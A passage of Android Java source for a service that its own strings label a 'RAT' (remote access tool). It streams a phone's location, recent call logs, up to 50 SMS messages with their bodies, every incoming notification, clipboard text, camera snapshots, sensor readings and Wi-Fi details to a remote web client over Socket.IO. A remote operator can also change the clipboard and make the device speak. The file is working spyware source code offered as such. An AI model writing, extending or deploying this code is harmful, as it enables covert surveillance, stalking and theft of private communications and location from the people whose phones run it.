                com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, intervalMs)
                .setMinUpdateIntervalMillis(intervalMs / 2)
                .build();

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (android.location.Location location : locationResult.getLocations()) {
                    sendLocation(location.getLatitude(), location.getLongitude());
                }
            }
        };

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
            Log.d(TAG, "Started location updates with interval: " + intervalMs + "ms");
        } catch (SecurityException e) {
            Log.e(TAG, "Failed to start location updates", e);
            broadcastPermissionError();
        }
    }

    private void sendLocation(double latitude, double longitude) {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send location, no web client or socket disconnected");
            return;
        }

        try {
            JSONObject locationData = new JSONObject();
            locationData.put("from", socket.id());
            locationData.put("to", webClientId);
            locationData.put("latitude", latitude);
            locationData.put("longitude", longitude);
            socket.emit(Constants.EVENT_LOCATION, locationData);
            Log.d(TAG, "Sent location: lat=" + latitude + ", lng=" + longitude);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending location", e);
        }
    }

    private void requestLastLocation() {
        if (fusedLocationClient != null) {
            try {
                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                    if (location != null) {
                        sendLocation(location.getLatitude(), location.getLongitude());
                    }
                });
            } catch (SecurityException ignored) {}
        }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
            Log.d(TAG, "Stopped location updates");
        }
    }

    private void startNotificationListener() {
        Intent intent = new Intent(this, NotificationListener.class);
        startService(intent);
    }

    private void sendCallLogs() {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send call logs, no web client or socket disconnected");
            return;
        }

        try {
            ContentResolver resolver = getContentResolver();
            String[] projection = {
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };
            Cursor cursor = resolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );

            if (cursor == null) {
                Log.e(TAG, "Failed to query call logs");
                return;
            }

            JSONArray callLogs = new JSONArray();
            int count = 0;
            while (cursor.moveToNext() && count < 10) {
                JSONObject call = new JSONObject();
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                call.put("number", number != null ? number : "Unknown");
                call.put("type", getCallTypeString(type));
                call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                call.put("duration", duration);

                callLogs.put(call);
                count++;
            }
            cursor.close();

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("call_logs", callLogs);

            socket.emit(Constants.EVENT_CALL_LOG, msg);
            Log.d(TAG, "Sent call logs: " + callLogs.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending call logs", e);
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs", e);
        }
    }

    private void sendSmsMessages() {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send SMS messages, no web client or socket disconnected");
            return;
        }

        try {
            ContentResolver resolver = getContentResolver();
            String[] projection = {
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
            };
            Cursor cursor = resolver.query(
                    Telephony.Sms.CONTENT_URI,
                    projection,
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC"
            );

            if (cursor == null) {
                Log.e(TAG, "Failed to query SMS messages");
                return;
            }

            JSONArray smsMessages = new JSONArray();
            int count = 0;
            while (cursor.moveToNext() && count < 50) {
                JSONObject sms = new JSONObject();
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                sms.put("address", address != null ? address : "Unknown");
                sms.put("body", body != null ? body : "");
                sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                sms.put("type", getSmsTypeString(type));

                smsMessages.put(sms);
                count++;
            }
            cursor.close();

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("sms_messages", smsMessages);

            socket.emit(Constants.EVENT_SMS, msg);
            Log.d(TAG, "Sent SMS messages: " + smsMessages.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending SMS messages", e);
        } catch (Exception e) {
            Log.e(TAG, "Error querying SMS messages", e);
        }
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "Received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "Sent";
            default:
                return "Unknown";
        }
    }

    private void createAndSendOffer() {
        if (webClientId == null) {
            Log.w(TAG, "No web client available");
            return;
        }
        if (peerConnection == null) {
            Log.e(TAG, "PeerConnection is null, cannot create offer");
            return;
        }

        Log.d(TAG, "Creating offer for web client: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

        final String clientId = webClientId;
        final String socketId = socket != null ? socket.id() : null;
        if (socketId == null) {
            Log.e(TAG, "Socket ID is null, cannot create offer");
            return;
        }

        peerConnection.createOffer(new SdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sdp) {
                Log.d(TAG, "Offer created, SDP: " + sdp.description);
                String modifiedSdp = sdp.description.replace("a=sendrecv", "a=sendonly")
                        .replace("a=recvonly", "a=sendonly");
                SessionDescription modifiedSession = new SessionDescription(sdp.type, modifiedSdp);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override
                    public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp", modifiedSession.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to", clientId);
                            msg.put("from", socketId);
                            msg.put("signal", signal);
                            socket.emit(Constants.EVENT_SIGNAL, msg);
                            Log.d(TAG, "Sent offer to web client");
                        } catch (JSONException e) {
                            Log.e(TAG, "Offer send fail", e);
                        }
                    }
                    @Override
                    public void onSetFailure(String err) {
                        Log.e(TAG, "Set local desc fail: " + err);
                    }
                    @Override
                    public void onCreateSuccess(SessionDescription s) {}
                    @Override
                    public void onCreateFailure(String f) {
                        Log.e(TAG, "Create offer fail: " + f);
                    }
                }, modifiedSession);
            }
            @Override
            public void onSetSuccess() {}
            @Override
            public void onCreateFailure(String err) {
                Log.e(TAG, "Create offer fail: " + err);
            }
            @Override
            public void onSetFailure(String err) {
                Log.e(TAG, "Set desc fail: " + err);
            }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                SessionDescription ans = new SessionDescription(
                        SessionDescription.Type.ANSWER, signal.getString("sdp"));
                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
                Log.d(TAG, "Processed answer from web client");
            } else if (signal.has("candidate")) {
                JSONObject candidate = signal.getJSONObject("candidate");
                IceCandidate c = new IceCandidate(
                        candidate.getString("sdpMid"),
                        candidate.getInt("sdpMLineIndex"),
                        candidate.getString("candidate"));
                peerConnection.addIceCandidate(c);
                Log.d(TAG, "Added ICE candidate");
            }
        } catch (JSONException e) {
            Log.e(TAG, "Handle signaling error", e);
        }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override
        public void onCreateSuccess(SessionDescription s) {}
        @Override
        public void onSetSuccess() {
            Log.d(TAG, "SDP set success");
        }
        @Override
        public void onCreateFailure(String e) {
            Log.e(TAG, "SDP create fail: " + e);
        }
        @Override
        public void onSetFailure(String e) {
            Log.e(TAG, "SDP set fail: " + e);
        }
    };

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    Constants.CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Camera, mic, notifications, call logs, SMS, and location streaming");
            nm.createNotificationChannel(ch);
        }
        Intent stop = new Intent(this, StreamingService.class);
        stop.setAction(Constants.ACTION_STOP_STREAMING);
        PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                        PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);
        return new NotificationCompat.Builder(this, Constants.CHANNEL_ID)
                .setContentTitle("Streaming Active")
                .setContentText("Camera, mic, notifications, call logs, SMS, and location streaming")
                .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true)
                .build();
    }

    private void toggleSensorSubscription(JSONObject payload) {
        if (payload == null || sensorManager == null) return;
        boolean active = payload.optBoolean("active", false);
        isSensorSubscribed = active;
        if (active) {
            Log.d(TAG, "Subscribed to hardware sensors");
            if (lightSensor != null) {
                sensorManager.registerListener(this, lightSensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
            }
            if (proximitySensor != null) {
                sensorManager.registerListener(this, proximitySensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
            }
            if (accelSensor != null) {
                sensorManager.registerListener(this, accelSensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
            }
        } else {
            Log.d(TAG, "Unsubscribed from hardware sensors");
            sensorManager.unregisterListener(this);
        }
    }

    private float lastLight = -1;
    private float lastProximity = -1;
    private float[] lastAccel = new float[3];

    @Override
    public void onSensorChanged(android.hardware.SensorEvent event) {
        if (!isSensorSubscribed || webClientId == null || socket == null || !socket.connected()) return;
        
        boolean changed = false;
        int type = event.sensor.getType();
        if (type == android.hardware.Sensor.TYPE_LIGHT) {
            float val = event.values[0];
            if (Math.abs(val - lastLight) > 1.0f || lastLight == -1) {
                lastLight = val;
                changed = true;
            }
        } else if (type == android.hardware.Sensor.TYPE_PROXIMITY) {
            float val = event.values[0];
            if (val != lastProximity || lastProximity == -1) {
                lastProximity = val;
                changed = true;
            }
        } else if (type == android.hardware.Sensor.TYPE_ACCELEROMETER) {
            float x = event.values[0];
            float y = event.values[1];
            float z = event.values[2];
            if (Math.abs(x - lastAccel[0]) > 0.5f || Math.abs(y - lastAccel[1]) > 0.5f || Math.abs(z - lastAccel[2]) > 0.5f) {
                lastAccel[0] = x;
                lastAccel[1] = y;
                lastAccel[2] = z;
                changed = true;
            }
        }

        long now = System.currentTimeMillis();
        if (changed && (now - lastSensorEmitTime >= 1000)) {
            lastSensorEmitTime = now;
            try {
                JSONObject data = new JSONObject();
                data.put("to", webClientId);
                data.put("from", socket.id());
                
                JSONObject sensors = new JSONObject();
                sensors.put("lux", lastLight);
                sensors.put("proximity", lastProximity);
                sensors.put("accelX", Math.round(lastAccel[0] * 100.0) / 100.0);
                sensors.put("accelY", Math.round(lastAccel[1] * 100.0) / 100.0);
                sensors.put("accelZ", Math.round(lastAccel[2] * 100.0) / 100.0);
                data.put("sensors", sensors);
                
                socket.emit(Constants.EVENT_SENSOR_DATA, data);
            } catch (JSONException e) {
                Log.e(TAG, "Sensor JSON compilation error", e);
            }
        }
    }

    @Override
    public void onAccuracyChanged(android.hardware.Sensor sensor, int accuracy) {}

    private void sendNetworkDiagnostics() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            android.net.ConnectivityManager connManager = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            
            String connectionType = "Unknown";
            String ssid = "Unavailable";
            int rssi = -127;
            int linkSpeed = 0;
            String localIp = "0.0.0.0";

            if (connManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.net.Network activeNetwork = connManager.getActiveNetwork();
                    if (activeNetwork != null) {
                        android.net.NetworkCapabilities caps = connManager.getNetworkCapabilities(activeNetwork);
                        if (caps != null) {
                            if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) {
                                connectionType = "WIFI";
                            } else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) {
                                connectionType = "MOBILE";
                            } else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) {
                                connectionType = "ETHERNET";
                            }
                        }
                    }
                } else {
                    @SuppressWarnings("deprecation")
                    android.net.NetworkInfo activeNet = connManager.getActiveNetworkInfo();
                    if (activeNet != null && activeNet.isConnected()) {
                        connectionType = activeNet.getTypeName();
                    }
                }
            }

            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                if (wifiInfo != null) {
                    ssid = wifiInfo.getSSID();
                    if (ssid.startsWith("\"") && ssid.endsWith("\"")) {
                        ssid = ssid.substring(1, ssid.length() - 1);
                    }
                    rssi = wifiInfo.getRssi();
                    linkSpeed = wifiInfo.getLinkSpeed();
                    
                    int ip = wifiInfo.getIpAddress();
                    localIp = String.format(Locale.getDefault(), "%d.%d.%d.%d",
                            (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
                }
            }

            JSONObject netInfo = new JSONObject();
            netInfo.put("connectionType", connectionType);
            netInfo.put("ssid", ssid);
            netInfo.put("rssi", rssi);
            netInfo.put("linkSpeed", linkSpeed);
            netInfo.put("localIp", localIp);

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("network", netInfo);

            socket.emit(Constants.EVENT_NETWORK_INFO, msg);
            Log.d(TAG, "Sent network diagnostics profile");
        } catch (Exception e) {
            Log.e(TAG, "Network diagnostics fetch error", e);
        }
    }

    private void takeCameraSnapshot(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        boolean useFront = payload.optBoolean("useFront", false);
        Log.d(TAG, "Taking photo snapshot with camera lens facing: " + (useFront ? "Front" : "Back"));
        new Thread(() -> {
            cameraManager.captureSnapshot(useFront, base64Image -> {
                if (webClientId == null || socket == null || !socket.connected()) return;
                try {
                    JSONObject data = new JSONObject();
                    data.put("image", base64Image);
                    data.put("camera", useFront ? "front" : "back");

                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket.id());
                    msg.put("snapshot", data);

                    socket.emit(Constants.EVENT_SNAPSHOT_DATA, msg);
                    Log.d(TAG, "JPEG snapshot delivered to target web client");
                } catch (JSONException e) {
                    Log.e(TAG, "Snapshot packaging failed", e);
                }
            });
        }).start();
    }

    private void getClipboardText() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                String text = "";
                if (clipboard != null && clipboard.hasPrimaryClip()) {
                    android.content.ClipData clip = clipboard.getPrimaryClip();
                    if (clip != null && clip.getItemCount() > 0) {
                        CharSequence chars = clip.getItemAt(0).getText();
                        if (chars != null) {
                            text = chars.toString();
                        }
                    }
                }
                
                JSONObject payload = new JSONObject();
                payload.put("to", webClientId);
                payload.put("from", socket.id());
                payload.put("clipboard", text);

                socket.emit(Constants.EVENT_CLIPBOARD_DATA, payload);
                Log.d(TAG, "Clipboard text fetched and sent: " + text);
            } catch (Exception e) {
                Log.e(TAG, "Read clipboard failed", e);
            }
        });
    }

    private void setClipboardText(JSONObject payload) {
        if (payload == null) return;
        String text = payload.optString("text", "");
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null) {
                    android.content.ClipData clip = android.content.ClipData.newPlainText("RAT Clipboard", text);
                    clipboard.setPrimaryClip(clip);
                    Log.d(TAG, "Device clipboard text updated remotely");
                    showToast(new JSONObject().put("text", "Clipboard updated"));
                }
            } catch (Exception e) {
                Log.e(TAG, "Write clipboard failed", e);
            }
        });
    }

    @Override
    public void onInit(int status) {
        if (status == TextToSpeech.SUCCESS) {
            if (tts != null) {
                tts.setLanguage(Locale.US);
                Log.d(TAG, "TTS Synthesizer initialized successfully");
            }
        } else {
            Log.e(TAG, "TTS Initialization failed");
        }
    }

    private void speakTts(JSONObject payload) {
        if (payload == null || tts == null) return;
        try {
            String text = payload.optString("text", "");
            float pitch = (float) payload.optDouble("pitch", 1.0);
            float speed = (float) payload.optDouble("speed", 1.0);
            if (!text.isEmpty()) {
                tts.setPitch(pitch);
                tts.setSpeechRate(speed);
                tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RAT_TTS");
                Log.d(TAG, "Spoke phrase remotely via TTS: " + text);
            }
        } catch (Exception e) {
            Log.e(TAG, "TTS Speech output error", e);
        }
    }

    private void cleanup() {
        if (tts != null) {
            tts.stop();
            tts.shutdown();
            tts = null;
        }
        if (sensorManager != null) {
            sensorManager.unregisterListener(this);
        }
        stopLocationUpdates();
        
        if (cameraManager != null) {
            cameraManager.dispose();
            cameraManager = null;
        }
        if (localRecorder != null) {
            localRecorder.stop(null);
            localRecorder = null;
        }
        
        if (audioSource != null) {
            audioSource.dispose();
            audioSource = null;
        }
        if (peerConnection != null) {
            peerConnection.close();
            peerConnection = null;
        }
        if (eglBase != null) {
            eglBase.release();
            eglBase = null;
        }
        if (factory != null) {
            factory.dispose();
            factory = null;
        }

        Intent intent = new Intent(this, NotificationListener.class);
        stopService(intent);
    }

    public static class NotificationListener extends NotificationListenerService {
        private Socket socket;
        private String webClientId;

        @Override
        public void onCreate() {
            super.onCreate();
            Log.d(TAG, "NotificationListener onCreate");
            connectSignaling();
        }

        private String getSignalingUrl() {
            SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
            return prefs.getString(Constants.PREF_SIGNALING_URL, Constants.DEFAULT_SIGNALING_URL);
        }

        private void connectSignaling() {
            try {
                IO.Options opts = new IO.Options();
                opts.transports = new String[]{"websocket"};
                String signalingUrl = getSignalingUrl();
                socket = IO.socket(signalingUrl, opts);

                socket.on(Socket.EVENT_CONNECT, args -> {
                    Log.d(TAG, "NotificationListener Socket.IO CONNECTED");
                    socket.emit(Constants.EVENT_IDENTIFY, "android");
                }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
                    if (args.length > 0 && args[0] instanceof String) {
                        webClientId = (String) args[0];
                        Log.d(TAG, "NotificationListener Web client ready: " + webClientId);
                    } else {
                         Log.w(TAG, "NotificationListener invalid web-client-ready args: " + Arrays.toString(args));
                    }
                }).on(Socket.EVENT_CONNECT_ERROR, args -> {
                    Log.e(TAG, "NotificationListener Connect error: " + Arrays.toString(args));
                });
                socket.connect();
            } catch (URISyntaxException e) {
                Log.e(TAG, "NotificationListener Bad signaling URL", e);
            }
        }

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            if (webClientId == null || socket == null || !socket.connected()) {
                Log.w(TAG, "Cannot send notification, no web client or socket disconnected");
                return;
            }

            try {
                Notification notification = sbn.getNotification();
                String appName = sbn.getPackageName();
                String title = notification.extras.getString(Notification.EXTRA_TITLE, "No Title");
                String text = notification.extras.getString(Notification.EXTRA_TEXT, "No Text");
                String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime()));

                JSONObject notificationData = new JSONObject();
                notificationData.put("appName", appName);
                notificationData.put("title", title);
                notificationData.put("text", text);
                notificationData.put("timestamp", timestamp);

                JSONObject msg = new JSONObject();
                msg.put("to", webClientId);
                msg.put("from", socket.id());
                msg.put("notification", notificationData);

                socket.emit(Constants.EVENT_NOTIFICATION, msg);
                Log.d(TAG, "Sent notification: " + notificationData.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error sending notification", e);
            }
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            if (socket != null) {
                socket.disconnect();
                socket = null;
            }
            Log.d(TAG, "NotificationListener onDestroy");
        }
    }
}